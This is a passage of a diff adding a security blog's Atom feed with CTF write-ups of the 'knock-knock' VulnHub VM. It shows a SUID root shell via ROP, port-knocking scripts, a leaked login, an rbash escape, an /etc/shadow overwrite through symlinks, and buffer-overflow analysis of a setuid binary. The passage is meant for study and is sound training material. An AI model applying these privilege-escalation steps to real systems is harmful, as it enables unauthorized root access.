+-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
+-rwsr-xr-x 1 root  jason 5120 Oct 16 14:32 write        # this is a copy of our helper program, but SETUID!
+jason@knockknock:~$ ./write                             # let's give it a spin!
+# whoami
+root                                                    # YEAHHH!!
+</code></pre>
+
+<p>And picture-proof:</p>
+
+<p><img src="/assets/knockknock-rop.png" alt="" /></p>
+
+<p>It worked! The file <code>write</code> is created with SUID set and contains the shell-spawning helper program. Mind you, when I was writing this ROP exploit, I used a local copy of <code>tfc</code> that was not running as root. When the <code>write</code> file was created, it had the SUID bit set, but as soon as something was written to it, the SUID bit was removed. This is security feature (?) is ignored when running as root! Lucky for me ;)</p>
+
+<p>So this is another way to root. I wonder how many more there are! :) Again, thanks zer0w1re and <a href="http://vulnhub.com">VulnHub</a> for hosting this VM! Also cheers to leonjza for proof-reading this post!!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Knock-knock-knocking on Root's Door]]></title>
+    <link href="http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/"/>
+    <updated>2014-10-14T21:21:59+02:00</updated>
+    <id>http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door</id>
+    <content type="html"><![CDATA[<p>Near the end of ASIS CTF, in which <code>vulnhub-ctf</code> took part, zer0w1re decided to release his first VM called knock-knock! Naturally, I had to download it and give it a shot :)</p>
+
+<!--more-->
+
+
+<p>The name already gives a big hint. I supposed I had to deal with a port-knocking deamon like <code>knockd</code>. I opened the ova in VirtualBox and booted the virtual machine. I ran a ping scan with <code>nmap</code> and then a normal scan.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -p- -T4
+Starting Nmap 6.00 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org&quot;</span>&gt;http://nmap.org&lt;/a&gt; <span class="o">)</span> at 2014-10-14 21:27 CEST&lt;/p&gt;
+
+&lt;p&gt;Nmap scan report <span class="k">for</span> 10.8.7.101
+Host is up <span class="o">(</span>0.00052s latency<span class="o">)</span>.
+Not shown: <span class="m">65534</span> filtered ports
+PORT     STATE SERVICE
+1337/tcp open  waste
+MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>&lt;/p&gt;
+
+&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 143.73 seconds</code></pre></div></p>
+
+<p>The scan took ages to complete, but did give me exactly <em>one</em> port to connect to. If that isn&rsquo;t a clear path, then I don&rsquo;t know what is. Connecting to 1337 with <code>nc</code> returns a list of three numbers. Not just any kind of numbers, no! They had to be port numbers. Let the knocking commence! I whipped up a small Python script to automate it:</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">1337</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span></code></pre></div></p>
+
+<p>Probably not the most elegant way of doing it, but I was still in a CTF mindset ;) I ran the script and then <code>nmap</code> again, but found that nothing had happened! What could be going on here? I tried to debug script a bit, added the try/except blocks to make it robust, but I couldn&rsquo;t figure out why it wasn&rsquo;t working. Maybe not all of the knocks were getting through? I decided to run the script continuously:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> python ./knock.py<span class="p">;</span> <span class="k">done</span>
+port: 37586
+port: 25290
+port: 48122
+port: 16312
+port: 44654
+port: 25600
+port: 53987
+port: 55993
+&lt;snip&gt;</code></pre></div></p>
+
+<p>After a while, I ran <code>nmap</code> for the umpthieth time and lo and behold, <code>ssh</code> and <code>http</code> were open! Later, when I rooted the box, I had a look at the script that sets up the port knocking. It randomizes the port order, so there&rsquo;s a one in six chance that my script gets it right. I modified it so that it completes the port-knocking every time:</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">itertools</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">knock</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">port</span><span class="p">:</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.8</span><span class="o">.</span><span class="mf">7.101</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">1337</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="n">portlist</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
+    <span class="n">knock</span><span class="p">(</span><span class="n">portlist</span><span class="p">)</span></code></pre></div></p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -T4 -p1-100&lt;/p&gt;
+
+&lt;p&gt;Starting Nmap 6.00 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org&quot;</span>&gt;http://nmap.org&lt;/a&gt; <span class="o">)</span> at 2014-10-14 21:35 CEST
+Nmap scan report <span class="k">for</span> 10.8.7.101
+Host is up <span class="o">(</span>0.00043s latency<span class="o">)</span>.
+Not shown: <span class="m">98</span> filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>&lt;/p&gt;
+
+&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1.93 seconds</code></pre></div></p>
+
+<p>I had no credentials for <code>ssh</code> so I fired up a browser and pointed it at 10.8.7.101. I also started <code>dirbuster</code> just in case.</p>
+
+<p><img src="/assets/knockknock-00.png" alt="" /></p>
+
+<p>Not much was on that webpage, not even in the source. I grabbed the image and poked at it using stego tools such as <code>stepic</code> and <code>outguess</code>, which came up negative. A quick <code>strings</code> on the jpg revealed something much more interesting:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>strings knockknock.jpg
+&lt;snip&gt;
+<span class="nv">CN</span><span class="o">=</span>i
+<span class="se">\,</span>mk
+1W<span class="o">}</span>R
+LUv&lt;em&gt;
+<span class="se">\U</span>v&lt;/em&gt;
+*M1W
+tR<span class="o">)</span>O
+MO:/?
+qW<span class="p">|</span>U
++<span class="se">\U</span>
+Login Credentials
+abfnW
+sax2Cw9Ow</code></pre></div></p>
+
+<p>I figured that it was worth a shot, even though the credentials looked weird. Needless to say, they didn&rsquo;t work. I switched them around as well but no luck. The strings looked mangled, so what could have been done to them? <code>rot13</code> maybe? Indeed, after dumping the strings in <a href="http://www.rot13.com/">rot13.com</a>, I got something that resembled a user name: nosaJ, which is Jason reversed. The same was done for the password and the combination that let me in was <code>jason:jB9jP2knf</code>. I could <code>ssh</code> in and was presented with a shell! I pressed &lsquo;up&rsquo; to view the command history, but <code>.bash_history</code> was symlinked to <code>/dev/null</code>. I fixed that and went on. <code>ls -alh</code> showed a setuid binary called <code>tfc</code>. Owned by root, I might add! Turns out that jason actually has a restricted bash, but that was quickly solved using <code>nice /bin/bash</code> (after Persistence, I learned four more ways of escaping <code>rbash</code> ;)).</p>
+
+<p>Looking at this <code>tfc</code> binary, it seems that it is a &ldquo;tiny file crypter&rdquo;. Playing around with it, I was able to encrypt a file and decrypt it again. This meant that it was doing some kind of symmetrical encryption.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>./tfc&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;_&lt;em&gt;    &lt;/em&gt;&lt;strong&gt;/_   &lt;/strong&gt;&lt;strong&gt;&lt;em&gt;/_   &lt;/em&gt;&lt;/strong&gt; <span class="se">\</span>
+  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    &lt;strong&gt;<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
+  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    _&lt;/strong&gt;&lt;em&gt;
+  <span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>    _&lt;/strong&gt;  /    _&lt;/em&gt;____  /
+                <span class="se">\/</span>            <span class="se">\/</span>&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Tiny File Crypter - 1.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Usage: ./tfc <span class="p">&amp;</span>lt<span class="p">;</span>filein.tfc&gt; <span class="p">&amp;</span>lt<span class="p">;</span>fileout.tfc&gt;</code></pre></div></p>
+
+<p>When I downloaded the first public version of this VM, <code>tfc</code> still allowed symlinks. It wanted the filenames to end with .tfc, so I made a symlink to <code>/etc/shadow</code>, used that as input for <code>tfc</code>, decrypted it to get the shadow file. I then copied the line containing the hash of jason&rsquo;s password and overwrote the line for root. Reversing the process again overwrote <code>/etc/shadow</code> and I had root! However, this was not intended and zer0w1re released a fixed version&hellip;</p>
+
+<p>So I had to exploit <code>tfc</code> the proper way. Now, this binary was made by c0ne, so I was in for a treat! I first gave it a huge input file:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*10000<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc
+jason@knockknock:~<span class="nv">$ </span>./tfc ./in.tfc out.tfc
+Segmentation fault</code></pre></div></p>
+
+<p>Well, well, well, a segfault! This looked promising. Unfortunately, <code>gdb</code> was not installed on this VM, so I transferred the binary over to my box and repeated the process.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*10000<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc in.tfc out.tfc
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>&lt;/p&gt;
+
+&lt;p&gt;bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
+GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
+&lt;snip&gt;
+Program terminated with signal 11, Segmentation fault.&lt;/p&gt;
+
+&lt;h1&gt;0  0x0675c916 in ?? <span class="o">()</span>&lt;/h1&gt;
+
+&lt;p&gt;gdb-peda<span class="err">$</span></code></pre></div></p>
+
+<p>Hmm. So we have a segfault, but <code>eip</code> is not overwritten by <code>0x41414141</code>. Something funky is going on! I assumed <code>eip</code> was being overwritten by the encrypted bytes, so I needed to first encrypt my payload before <code>tfc</code> would process it and decrypt it again. Over at #vulnhub, recrudesce dropped a nice link for an online disassembler. I decided that this was a nice moment to give <a href="http://decompiler.fit.vutbr.cz/">the Retargetable Decompiler</a> a spin! I uploaded the binary and using the output and <code>objdump</code>, I started analyzing the binary.</p>
+
+<p><img src="/assets/knockknock-01.png" alt="" /></p>
+
+<p>It boils down to this: the binary takes an input file, read it four bytes at a time, and encrypts it using the <code>xcrypt</code> function. For the next four bytes, it shuffles the XOR key around. It loops until there are less than four bytes remaining, which are also encrypted. I decided to rip and copy this decompiled C code as much as possible. I have changed the names of the variables a bit:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int32_t</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span> <span class="n">a1_buffer</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">a2_buffersize</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v1_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int32_t</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">a1_buffer</span><span class="p">;</span>
+    <span class="kt">int32_t</span> <span class="n">v2</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
+    <span class="kt">int32_t</span> <span class="n">v4_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int32_t</span> <span class="n">v5_xor</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// 0x8048634</span>
+        <span class="n">v3_buffer</span><span class="p">[</span><span class="n">v4_index</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v5_xor</span><span class="p">;</span>
+
+        <span class="kt">uint32_t</span> <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v5_xor</span><span class="p">;</span>
+        <span class="c1">// branch -&amp;gt; 0x8048662</span>
+        <span class="kt">int32_t</span> <span class="n">v7_temp</span><span class="p">;</span> <span class="c1">// 0x804866f</span>
+
+        <span class="cm">/* change v6_xor */</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">uint32_t</span> <span class="n">v8</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 0x8048678</span>
+            <span class="n">v7_temp_xor</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">v8</span> <span class="p">:</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span><span class="p">;</span>
+            <span class="c1">// PHI copies at the loop end</span>
+            <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
+            <span class="c1">// loop 0x8048662 end</span>
+        <span class="p">}</span>
+
+        <span class="kt">int32_t</span> <span class="n">v9_indexplusone</span> <span class="o">=</span> <span class="n">v4_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 0x8048685</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">v9_indexplusone</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 0x8048685</span>
+            <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
+            <span class="n">v4_index</span> <span class="o">=</span> <span class="n">v9_index</span><span class="p">;</span>
+            <span class="n">v5_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
+            <span class="c1">// branch -&amp;gt; 0x8048634</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">v2_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int32_t</span> <span class="n">v10</span> <span class="o">=</span> <span class="n">a2_buffersize</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// 0x80486d7</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">v10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// 0x80486df</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* encrypt last bytes, but lets assume our sploit will be 4 byte aligned */</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>I wrote a very, very ugly piece of Python do the encryption for me:</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ow">in</span><span class="o">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">xorkey</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
